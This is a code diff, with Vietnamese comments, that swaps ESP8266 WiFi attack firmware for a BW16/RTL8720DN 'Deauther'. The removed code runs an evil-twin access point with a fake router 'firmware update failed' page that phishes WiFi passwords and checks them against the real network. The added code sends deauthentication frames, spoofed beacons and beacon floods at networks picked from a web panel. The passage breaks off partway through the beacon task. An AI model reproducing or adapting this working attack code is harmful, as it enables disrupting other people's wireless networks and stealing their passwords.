@@ -1,396 +1,735 @@
 #include <Arduino.h>
-#include <ESP8266WiFi.h>
-#include <DNSServer.h>
-#include <ESP8266WebServer.h>
-#include <ESP8266HTTPClient.h>
+#include <WiFi.h>
+#include <WiFiServer.h>
+#include <WiFiClient.h>
+#include <vector>
+#include <map>
+#include "wifi_conf.h"
+#include "wifi_cust_tx.h"
+#include "wifi_util.h"
+#include "wifi_structures.h"
+#include "debug.h"
 
-extern "C" {
-#include "user_interface.h"
-}
+// Bao gồm FreeRTOS (nếu SDK BW16 đã tích hợp FreeRTOS)
+#include <FreeRTOS.h>
+#include <task.h>
 
+// Nếu LED đã được định nghĩa trong variant thì không định nghĩa lại
+#ifndef LED_R
+  #define LED_R 2
+#endif
+#ifndef LED_G
+  #define LED_G 3
+#endif
+#ifndef LED_B
+  #define LED_B 4
+#endif
 
-typedef struct
-{
+// --------------------------------------------------
+// Các trạng thái của mạch
+enum DeviceState {
+  STATE_IDLE,         // Chỉ AP hoạt động
+  STATE_SCANNING,     // Đang quét mạng
+  STATE_ATTACK,       // Đang tấn công deauth
+  STATE_BEACON,       // Đang phát Beacon (nhái)
+  STATE_BEACON_FLOOD  // Mới: Đang thực hiện Beacon Flood
+};
+
+volatile DeviceState currentState = STATE_IDLE;  // volatile vì được truy cập từ nhiều task
+
+// Các hằng số LED pattern (millisecond)
+const unsigned long BLINK_INTERVAL_ATTACK       = 1000;
+const unsigned long BLINK_INTERVAL_SCANNING     = 500;
+const unsigned long BLINK_INTERVAL_BEACON       = 1000; // LED nhấp nháy khi phát beacon (nhái)
+const unsigned long BLINK_INTERVAL_BEACON_FLOOD = 200;  // LED nhấp nháy khi beacon flood
+
+// --------------------------------------------------
+// Cấu trúc lưu trữ kết quả quét WiFi
+struct WiFiScanResult {
   String ssid;
-  uint8_t ch;
+  String bssid_str;
   uint8_t bssid[6];
-}  _Network;
+  short rssi;
+  uint8_t channel;
+};
 
+// Thông tin AP cho chế độ Access Point
+const char *ssid_ap = "BW16";
+const char *pass_ap = "deauther";
 
-const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
-DNSServer dnsServer;
-ESP8266WebServer webServer(80);
+// Kênh mặc định (có thể thay đổi theo môi trường)
+int current_channel = 12;
 
-_Network _networks[16];
-_Network _selectedNetwork;
+// Danh sách kết quả quét
+std::vector<WiFiScanResult> scan_results;
 
-void clearArray() {
-  for (int i = 0; i < 16; i++) {
-    _Network _network;
-    _networks[i] = _network;
-  }
+// Các vector lưu các mục tiêu tấn công (dùng cho deauth)
+std::vector<int> attack_targets_24;  // cho 2.4GHz (channel < 36)
+std::vector<int> attack_targets_5;   // cho 5GHz (channel >= 36)
 
-}
+// Các vector lưu các mục tiêu beacon (dùng để “nhái” beacon)
+std::vector<int> beacon_targets_24;  // cho 2.4GHz
+std::vector<int> beacon_targets_5;   // cho 5GHz
 
-String _correct = "";
-String _tryPassword = "";
+// Địa chỉ BSSID tạm thời để gửi frame (cho deauth)
+uint8_t deauth_bssid[6];
 
-// Default main strings
-#define SUBTITLE "ACCESS POINT RESCUE MODE"
-#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
-#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."
+// Reason code mặc định cho deauth
+const uint16_t DEFAULT_DEAUTH_REASON = 2;
+uint16_t deauth_reason = DEFAULT_DEAUTH_REASON;
 
-String header(String t) {
-  String a = String(_selectedNetwork.ssid);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }"
-               ;
-  String h = "<!DOCTYPE html><html>"
-             "<head><title><center>" + a + " :: " + t + "</center></title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-             "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h;
-}
+#define FRAMES_PER_DEAUTH       10    // số frame deauth gửi mỗi lần
+#define FRAMES_PER_BEACON       200   // số frame beacon gửi mỗi lần (chế độ nhái)
+#define FRAMES_PER_BEACON_FLOOD 500   // số frame beacon gửi mỗi lần (chế độ flood)
 
-String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
-}
+// --------------------------------------------------
+// Các khoảng thời gian riêng cho tấn công từng băng (ms)
+const unsigned long ATTACK_INTERVAL_24 = 150;
+const unsigned long ATTACK_INTERVAL_5  = 5;
+unsigned long lastAttackTime24 = 0;
+unsigned long lastAttackTime5  = 0;
+static int currentTargetIndex24 = 0;
+static int currentTargetIndex5  = 0;
 
-String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
-}
+// Các biến chỉ số cho beacon (các mục được “nhái” hoặc flood)
+static int currentBeaconIndex24 = 0;
+static int currentBeaconIndex5  = 0;
 
-void setup() {
+// --------------------------------------------------
+// Hàm cập nhật LED theo trạng thái (non‑blocking)
+void updateLEDs() {
+  static unsigned long lastToggleTime = 0;
+  static bool ledState = false;
+  unsigned long now = millis();
+  // Tắt tất cả LED trước khi cập nhật
+  digitalWrite(LED_R, LOW);
+  digitalWrite(LED_G, LOW);
+  digitalWrite(LED_B, LOW);
 
-  Serial.begin(115200);
-  WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-  WiFi.softAP("Quốc Tài", "deauther");
-  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-  webServer.on("/", handleIndex);
-  webServer.on("/result", handleResult);
-  webServer.on("/admin", handleAdmin);
-  webServer.onNotFound(handleIndex);
-  webServer.begin();
-}
-void performScan() {
-  int n = WiFi.scanNetworks();
-  clearArray();
-  if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
-      _Network network;
-      network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) {
-        network.bssid[j] = WiFi.BSSID(i)[j];
-      }
-
-      network.ch = WiFi.channel(i);
-      _networks[i] = network;
+  if (currentState == STATE_IDLE) {
+    // Idle: LED đỏ sáng ổn định
+    digitalWrite(LED_R, HIGH);
+  } else if (currentState == STATE_SCANNING) {
+    if (now - lastToggleTime >= BLINK_INTERVAL_SCANNING) {
+      ledState = !ledState;
+      lastToggleTime = now;
     }
+    digitalWrite(LED_B, ledState ? HIGH : LOW);
+  } else if (currentState == STATE_ATTACK) {
+    if (now - lastToggleTime >= BLINK_INTERVAL_ATTACK) {
+      ledState = !ledState;
+      lastToggleTime = now;
+    }
+    digitalWrite(LED_G, ledState ? HIGH : LOW);
+  } else if (currentState == STATE_BEACON) {
+    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON) {
+      ledState = !ledState;
+      lastToggleTime = now;
+    }
+    digitalWrite(LED_R, ledState ? HIGH : LOW);
+  } else if (currentState == STATE_BEACON_FLOOD) {
+    if (now - lastToggleTime >= BLINK_INTERVAL_BEACON_FLOOD) {
+      ledState = !ledState;
+      lastToggleTime = now;
+    }
+    digitalWrite(LED_B, ledState ? HIGH : LOW);
   }
 }
 
-bool hotspot_active = false;
-bool deauthing_active = false;
+// --------------------------------------------------
+// Hàm callback xử lý kết quả quét WiFi
+rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
+  if (scan_result->scan_complete == 0) {
+    rtw_scan_result_t *record = &scan_result->ap_details;
+    record->SSID.val[record->SSID.len] = 0;  // đảm bảo chuỗi kết thúc
+    WiFiScanResult result;
+    result.ssid = String((const char *)record->SSID.val);
+    result.channel = record->channel;
+    result.rssi = record->signal_strength;
+    memcpy(result.bssid, &record->BSSID, 6);
+    char bssid_str[18] = {0};
+    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+             result.bssid[0], result.bssid[1], result.bssid[2],
+             result.bssid[3], result.bssid[4], result.bssid[5]);
+    result.bssid_str = String(bssid_str);
+    scan_results.push_back(result);
+  }
+  return RTW_SUCCESS;
+}
 
-void handleResult() {
-  String html = "";
-  if (WiFi.status() != WL_CONNECTED) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    }
-    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
-    Serial.println("Wrong password tried!");
+// --------------------------------------------------
+// Hàm quét các mạng WiFi (khoảng 5 giây)
+int scanNetworks() {
+  currentState = STATE_SCANNING;
+  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
+  scan_results.clear();
+  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
+    // Sử dụng vTaskDelay để không chặn scheduler
+    vTaskDelay(pdMS_TO_TICKS(5000));
+    DEBUG_SER_PRINT("Scan done!\n");
+    currentState = STATE_IDLE;
+    return 0;
   } else {
-    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
-    hotspot_active = false;
-    dnsServer.stop();
-    int n = WiFi.softAPdisconnect (true);
-    Serial.println(String(n));
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("Quốc Tài", "deauther");
-    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    Serial.println("Good password was entered !");
-    Serial.println(_correct);
+    DEBUG_SER_PRINT("Scan failed!\n");
+    currentState = STATE_IDLE;
+    return 1;
   }
 }
 
+// --------------------------------------------------
+// Parse request HTTP: trả về URL (đã trim khoảng trắng)
+String parseRequest(String request) {
+  if (request.length() == 0) return "";
+  int path_start = request.indexOf(' ') + 1;
+  int path_end = request.indexOf(' ', path_start);
+  String path = request.substring(path_start, path_end);
+  path.trim();
+  return path;
+}
 
-String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
-                   "</head><body><div class='content'>"
-                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
-                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
-                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
-                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
-                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+// Phân tích dữ liệu POST thành các cặp key-value (không decode URL)
+std::vector<std::pair<String, String>> parsePost(String &request) {
+    std::vector<std::pair<String, String>> post_params;
+    int body_start = request.indexOf("\r\n\r\n");
+    if (body_start == -1) return post_params;
+    body_start += 4;
+    String post_data = request.substring(body_start);
+    int start = 0;
+    int end = post_data.indexOf('&', start);
+    while (end != -1) {
+        String key_value_pair = post_data.substring(start, end);
+        int delimiter_position = key_value_pair.indexOf('=');
+        if (delimiter_position != -1) {
+            String key = key_value_pair.substring(0, delimiter_position);
+            String value = key_value_pair.substring(delimiter_position + 1);
+            post_params.push_back({key, value});
+        }
+        start = end + 1;
+        end = post_data.indexOf('&', start);
+    }
+    String key_value_pair = post_data.substring(start);
+    int delimiter_position = key_value_pair.indexOf('=');
+    if (delimiter_position != -1) {
+        String key = key_value_pair.substring(0, delimiter_position);
+        String value = key_value_pair.substring(delimiter_position + 1);
+        post_params.push_back({key, value});
+    }
+    return post_params;
+}
 
-void handleIndex() {
+// --------------------------------------------------
+// Tạo phản hồi HTTP (header)
+String makeResponse(int code, String content_type) {
+  String response = "HTTP/1.1 " + String(code) + " OK\r\n";
+  response += "Content-Type: " + content_type + "\r\n";
+  response += "Connection: close\r\n\r\n";
+  return response;
+}
 
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
-        _selectedNetwork = _networks[i];
+// --------------------------------------------------
+// Giao diện Web (HTML) – sử dụng CSS hiện đại, responsive
+// Ở đây ta dùng 1 form chứa bảng các mạng quét được và 3 nút submit riêng cho deauth, beacon và beacon flood.
+void handleRoot(WiFiClient &client) {
+  String response = makeResponse(200, "text/html") +
+  R"(
+  <!DOCTYPE html>
+  <html lang="vi">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RTL8720DN Deauther</title>
+    <style>
+      /* Reset cơ bản */
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+      body { font-family: Arial, Helvetica, sans-serif; background: #f2f4f8; color: #333; line-height: 1.4; padding: 5px; font-size: 14px; }
+      .container { max-width: 960px; margin: 10px auto; background: #fff; border-radius: 8px; box-shadow: 0 3px 8px rgba(0,0,0,0.1); overflow: hidden; }
+      header { background: #2980b9; color: #fff; padding: 10px; text-align: center; }
+      header h1 { font-size: 1.4em; }
+      main { padding: 10px; }
+      table { width: 100%; border-collapse: collapse; margin-bottom: 10px; }
+      thead { background: #3498db; color: #fff; }
+      th, td { padding: 6px 4px; text-align: center; border-bottom: 1px solid #ddd; font-size: 0.8em; }
+      tbody tr:nth-child(even) { background: #f9fafc; }
+      .btn { display: block; width: 100%; border: none; border-radius: 4px; padding: 8px; margin-bottom: 8px; font-size: 0.9em; cursor: pointer; transition: background 0.3s ease; }
+      .btn-launch { background: #27ae60; color: #fff; }
+      .btn-launch:hover { background: #219150; }
+      .btn-rescan { background: #3498db; color: #fff; }
+      .btn-rescan:hover { background: #2980b9; }
+      .btn-stop { background: #e74c3c; color: #fff; }
+      .btn-stop:hover { background: #cf3e33; }
+      @media (max-width: 600px) {
+        header h1 { font-size: 1.2em; }
+        th, td { padding: 4px; font-size: 0.75em; }
+        .btn { padding: 6px; font-size: 0.8em; }
       }
-    }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <h1>RTL8720DN Deauther</h1>
+      </header>
+      <main>
+        <form method="post" action="/action">
+          <table>
+            <thead>
+              <tr>
+                <th>Select</th>
+                <th>SSID</th>
+                <th>BSSID</th>
+                <th>Channel</th>
+                <th>RSSI</th>
+                <th>Freq</th>
+              </tr>
+            </thead>
+            <tbody>
+  )";
+  // Hiển thị mỗi mạng quét được trong một dòng của bảng:
+  for (uint32_t i = 0; i < scan_results.size(); i++) {
+    response += "<tr>";
+    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
+    response += "<td>" + scan_results[i].ssid + "</td>";
+    response += "<td>" + scan_results[i].bssid_str + "</td>";
+    response += "<td>" + String(scan_results[i].channel) + "</td>";
+    response += "<td>" + String(scan_results[i].rssi) + "</td>";
+    response += "<td>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
+    response += "</tr>";
   }
-
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
+  response += R"(
+            </tbody>
+          </table>
+          <button type="submit" name="action" value="deauth" class="btn btn-launch">Launch Deauth</button>
+          <button type="submit" name="action" value="beacon" class="btn btn-launch">Launch Beacon</button>
+          <button type="submit" name="action" value="beacon_flood" class="btn btn-launch">Launch Beacon Flood</button>
+        </form>
+        <form method="post" action="/rescan">
+          <button type="submit" class="btn btn-rescan">Rescan Networks</button>
+        </form>
+  )";
+  if (currentState == STATE_ATTACK || currentState == STATE_BEACON || currentState == STATE_BEACON_FLOOD) {
+    response += R"(
+      <form method="post" action="/stop">
+        <button type="submit" class="btn btn-stop">Stop Attack/Beacon</button>
+      </form>
+    )";
   }
+  response += R"(
+      </main>
+    </div>
+  </body>
+  </html>
+  )";
+  client.write(response.c_str());
+}
 
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
+// --------------------------------------------------
+// Hàm xử lý trang 404
+void handle404(WiFiClient &client) {
+  String response = makeResponse(404, "text/plain") + "Not found!";
+  client.write(response.c_str());
+}
 
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+// --------------------------------------------------
+// Khởi tạo đối tượng WiFiServer toàn cục (port 80)
+WiFiServer server(80);
 
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("Quốc Tài", "deauther");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
-    return;
+// --------------------------------------------------
+// Task: Cập nhật LED (non‑blocking)
+void LEDUpdateTask(void *pvParameters) {
+  (void) pvParameters;
+  while (1) {
+    updateLEDs();
+    vTaskDelay(pdMS_TO_TICKS(50));
   }
+}
 
-  if (hotspot_active == false) {
-    String _html = _tempHTML;
-
-    for (int i = 0; i < 16; ++i) {
-      if ( _networks[i].ssid == "") {
-        break;
+// --------------------------------------------------
+// Task: Web Server – lắng nghe và xử lý HTTP request
+void WebServerTask(void *pvParameters) {
+  (void) pvParameters;
+  server.begin();
+  while (1) {
+    WiFiClient client = server.available();
+    if (client && client.connected()) {
+      String request;
+      while (client.available()) {
+        request += (char)client.read();
+        vTaskDelay(pdMS_TO_TICKS(1));
       }
-      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
-
-      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
+      if (request.length() == 0 || request.indexOf("favicon.ico") >= 0) {
+        client.stop();
       } else {
-        _html += "<button>Select</button></form></td></tr>";
+        DEBUG_SER_PRINT("Request: " + request + "\n");
+        String path = parseRequest(request);
+        DEBUG_SER_PRINT("Path: " + path + "\n");
+        if (path == "/" || path == "/index.html") {
+          handleRoot(client);
+        } else if (path == "/rescan") {
+          scanNetworks();
+          handleRoot(client);
+        } else if (path == "/action") {
+          // Xử lý form gửi từ trang chủ
+          std::vector<std::pair<String, String>> post_data = parsePost(request);
+          String action = "";
+          // Lấy tham số "action"
+          for (auto &param : post_data) {
+            if (param.first == "action") {
+              action = param.second;
+              break;
+            }
+          }
+          if (action == "deauth") {
+            // Xử lý deauth: lưu các mục tiêu theo băng
+            attack_targets_24.clear();
+            attack_targets_5.clear();
+            for (auto &param : post_data) {
+              if (param.first == "network") {
+                int idx = param.second.toInt();
+                if (idx >= 0 && idx < (int)scan_results.size()) {
+                  uint8_t ch = scan_results[idx].channel;
+                  if (ch >= 36)
+                    attack_targets_5.push_back(idx);
+                  else
+                    attack_targets_24.push_back(idx);
+                  DEBUG_SER_PRINT("Deauth target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+                }
+              }
+            }
+            if (!attack_targets_24.empty() || !attack_targets_5.empty()) {
+              currentState = STATE_ATTACK;
+              currentTargetIndex24 = 0;
+              currentTargetIndex5 = 0;
+              lastAttackTime24 = millis();
+              lastAttackTime5  = millis();
+            }
+          } else if (action == "beacon") {
+            // Xử lý beacon: lưu các mục tiêu để gửi beacon (nhái)
+            beacon_targets_24.clear();
+            beacon_targets_5.clear();
+            for (auto &param : post_data) {
+              if (param.first == "network") {
+                int idx = param.second.toInt();
+                if (idx >= 0 && idx < (int)scan_results.size()) {
+                  uint8_t ch = scan_results[idx].channel;
+                  if (ch >= 36)
+                    beacon_targets_5.push_back(idx);
+                  else
+                    beacon_targets_24.push_back(idx);
+                  DEBUG_SER_PRINT("Beacon target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+                }
+              }
+            }
+            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+              currentState = STATE_BEACON;
+              currentBeaconIndex24 = 0;
+              currentBeaconIndex5 = 0;
+            }
+          } else if (action == "beacon_flood") {
+            // Xử lý beacon flood: lưu các mục tiêu được chọn
+            beacon_targets_24.clear();
+            beacon_targets_5.clear();
+            for (auto &param : post_data) {
+              if (param.first == "network") {
+                int idx = param.second.toInt();
+                if (idx >= 0 && idx < (int)scan_results.size()) {
+                  uint8_t ch = scan_results[idx].channel;
+                  if (ch >= 36)
+                    beacon_targets_5.push_back(idx);
+                  else
+                    beacon_targets_24.push_back(idx);
+                  DEBUG_SER_PRINT("Beacon flood target idx: " + String(idx) + " (" + ((ch>=36)?"5GHz":"2.4GHz") + ")\n");
+                }
+              }
+            }
+            if (!beacon_targets_24.empty() || !beacon_targets_5.empty()) {
+              currentState = STATE_BEACON_FLOOD;
+              currentBeaconIndex24 = 0;
+              currentBeaconIndex5 = 0;
+            }
+          }
+          handleRoot(client);
+        } else if (path == "/stop") {
+          currentState = STATE_IDLE;
+          attack_targets_24.clear();
+          attack_targets_5.clear();
+          beacon_targets_24.clear();
+          beacon_targets_5.clear();
+          handleRoot(client);
+        } else {
+          handle404(client);
+        }
+        client.stop();
       }
     }
-
-    if (deauthing_active) {
-      _html.replace("{deauth_button}", "Stop deauthing");
-      _html.replace("{deauth}", "stop");
-    } else {
-      _html.replace("{deauth_button}", "Start deauthing");
-      _html.replace("{deauth}", "start");
-    }
-
-    if (hotspot_active) {
-      _html.replace("{hotspot_button}", "Stop EvilTwin");
-      _html.replace("{hotspot}", "stop");
-    } else {
-      _html.replace("{hotspot_button}", "Start EvilTwin");
-      _html.replace("{hotspot}", "start");
-    }
-
-
-    if (_selectedNetwork.ssid == "") {
-      _html.replace("{disabled}", " disabled");
-    } else {
-      _html.replace("{disabled}", "");
-    }
-
-    _html += "</table>";
-
-    if (_correct != "") {
-      _html += "</br><h3>" + _correct + "</h3>";
-    }
-
-    _html += "</div></body></html>";
-    webServer.send(200, "text/html", _html);
-
-  } else {
-
-    if (webServer.hasArg("password")) {
-      _tryPassword = webServer.arg("password");
-      if (webServer.arg("deauth") == "start") {
-        deauthing_active = false;
-      }
-      delay(1000);
-      WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
-      if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-      }
-    } else {
-      webServer.send(200, "text/html", index());
-    }
+    vTaskDelay(pdMS_TO_TICKS(10));
   }
-
 }
 
-void handleAdmin() {
-
-  String _html = _tempHTML;
-
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
-        _selectedNetwork = _networks[i];
+// --------------------------------------------------
+// Task: Thực hiện tấn công deauth (gửi deauth frames)
+void AttackTask(void *pvParameters) {
+  (void) pvParameters;
+  while (1) {
+    if (currentState == STATE_ATTACK) {
+      unsigned long now = millis();
+      // Xử lý cho băng 2.4GHz
+      if (!attack_targets_24.empty() && (now - lastAttackTime24 >= ATTACK_INTERVAL_24)) {
+        int idx = attack_targets_24[currentTargetIndex24];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
+          for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
+            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Attacked 2.4GHz target idx: " + String(idx) + "\n");
+        }
+        currentTargetIndex24 = (currentTargetIndex24 + 1) % attack_targets_24.size();
+        lastAttackTime24 = now;
+      }
+      // Xử lý cho băng 5GHz
+      if (!attack_targets_5.empty() && (now - lastAttackTime5 >= ATTACK_INTERVAL_5)) {
+        int idx = attack_targets_5[currentTargetIndex5];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
+          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
+          for (int j = 0; j < FRAMES_PER_DEAUTH; j++) {
+            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+            vTaskDelay(pdMS_TO_TICKS(5));
+          }
+          DEBUG_SER_PRINT("Attacked 5GHz target idx: " + String(idx) + "\n");
+        }
+        currentTargetIndex5 = (currentTargetIndex5 + 1) % attack_targets_5.size();
+        lastAttackTime5 = now;
       }
     }
+    vTaskDelay(pdMS_TO_TICKS(10));
   }
-
-  if (webServer.hasArg("deauth")) {
-    if (webServer.arg("deauth") == "start") {
-      deauthing_active = true;
-    } else if (webServer.arg("deauth") == "stop") {
-      deauthing_active = false;
-    }
-  }
-
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str());
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-
-    } else if (webServer.arg("hotspot") == "stop") {
-      hotspot_active = false;
-      dnsServer.stop();
-      int n = WiFi.softAPdisconnect (true);
-      Serial.println(String(n));
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("WiPhi_34732", "d347h320");
-      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
-    }
-    return;
-  }
-
-  for (int i = 0; i < 16; ++i) {
-    if ( _networks[i].ssid == "") {
-      break;
-    }
-    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";
-
-    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
-    } else {
-      _html += "<button>Select</button></form></td></tr>";
-    }
-  }
-
-  if (deauthing_active) {
-    _html.replace("{deauth_button}", "Stop deauthing");
-    _html.replace("{deauth}", "stop");
-  } else {
-    _html.replace("{deauth_button}", "Start deauthing");
-    _html.replace("{deauth}", "start");
-  }
-
-  if (hotspot_active) {
-    _html.replace("{hotspot_button}", "Stop EvilTwin");
-    _html.replace("{hotspot}", "stop");
-  } else {
-    _html.replace("{hotspot_button}", "Start EvilTwin");
-    _html.replace("{hotspot}", "start");
-  }
-
-
-  if (_selectedNetwork.ssid == "") {
-    _html.replace("{disabled}", " disabled");
-  } else {
-    _html.replace("{disabled}", "");
-  }
-
-  if (_correct != "") {
-    _html += "</br><h3>" + _correct + "</h3>";
-  }
-
-  _html += "</table></div></body></html>";
-  webServer.send(200, "text/html", _html);
-
 }
 
-String bytesToStr(const uint8_t* b, uint32_t size) {
-  String str;
-  const char ZERO = '0';
-  const char DOUBLEPOINT = ':';
-  for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += ZERO;
-    str += String(b[i], HEX);
-
-    if (i < size - 1) str += DOUBLEPOINT;
+// --------------------------------------------------
+// Task: Thực hiện phát Beacon (gửi beacon frames “nhái” thông tin mục tiêu)
+// Mỗi mục tiêu được gửi FRAMES_PER_BEACON beacon frame.
+void BeaconTask(void *pvParameters) {
+  (void) pvParameters;
+  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+  while (1) {
+    if (currentState == STATE_BEACON) {
+      // Xử lý các mục tiêu băng 2.4GHz
+      if (!beacon_targets_24.empty()) {
+        int idx = beacon_targets_24[currentBeaconIndex24];
+        if (idx >= 0 && idx < (int)scan_results.size()) {
+          wext_set_channel(WLAN0_NAME, scan_results[idx].channel);
